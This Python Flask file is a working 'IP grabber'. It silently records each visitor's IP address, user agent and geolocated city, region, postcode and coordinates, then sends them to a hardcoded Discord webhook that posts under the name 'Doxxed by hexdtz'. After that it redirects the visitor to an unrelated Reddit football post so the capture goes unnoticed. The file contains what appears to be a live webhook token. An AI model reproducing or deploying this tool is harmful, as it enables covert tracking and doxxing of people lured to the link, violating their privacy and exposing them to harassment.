from flask import Flask, request, redirect
import requests
import json
from datetime import datetime

app = Flask(__name__)

DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1427010775163080868/6Uaf91MUBd4GO3eYSf4y3i0VZkKQh0_pFQFO7H8M42IKWwYQmEkNcisypFHTmvTClpoS"

# Simple set to store already-logged IPs (not persistent, just in-memory)
recent_ips = set()

def get_visitor_info(ip, user_agent):
    ipapi_url = f"https://ipapi.co/{ip}/json/"

    try:
        details = requests.get(ipapi_url, timeout=3).json()
    except Exception:
        details = {}

    info = {
        "ip": ip,
        "user_agent": user_agent,
        "country": details.get("country_name", "Unknown"),
        "countryCode": details.get("country_code", "xx").lower(),
        "region": details.get("region", ""),
        "city": details.get("city", ""),
        "zip": details.get("postal", ""),
        "lat": details.get("latitude", 0),
        "lon": details.get("longitude", 0),
        "date": datetime.utcnow().strftime("%d/%m/%Y"),  # GMT/UTC
        "time": datetime.utcnow().strftime("%H:%M:%S"),  # GMT/UTC
    }
    return info

def send_to_discord(info):
    flag_url = f"https://countryflagsapi.com/png/{info['countryCode']}"
    ip_city = f"{info['ip']} ({info['city'] if info['city'] else 'Unknown City'})"

    embed = {
        "username": "Doxxed by hexdtz",  # Custom name
        "avatar_url": flag_url,
        "embeds": [{
            "title": f"Visitor From {info['country']}",
            "color": 39423,
            "fields": [
                {"name": "IP & City", "value": ip_city, "inline": True},
                {"name": "User Agent", "value": info["user_agent"], "inline": False},
                {"name": "Country / Code", "value": f"{info['country']} / {info['countryCode'].upper()}", "inline": True},
                {"name": "Region | City | Zip", "value": f"[{info['region']} | {info['city']} | {info['zip']}](https://www.google.com/maps/search/?api=1&query={info['lat']},{info['lon']})", "inline": False},
            ],
            "footer": {
                "text": f"Time (GMT): {info['date']} {info['time']}",
                "icon_url": "https://e7.pngegg.com/pngimages/766/619/png-clipart-emoji-alarm-clocks-alarm-clock-time-emoticon.png"
            }
        }]
    }

    headers = {"Content-Type": "application/json"}
    requests.post(DISCORD_WEBHOOK_URL, data=json.dumps(embed), headers=headers)

@app.route('/')
def index():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent', 'Unknown')

    if ip not in recent_ips:
        recent_ips.add(ip)
        info = get_visitor_info(ip, user_agent)
        send_to_discord(info)

    # Redirect after capture
    return redirect("https://www.reddit.com/r/football/comments/y8xqif/how_to_be_better_in_football_in_a_fast_time/")

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
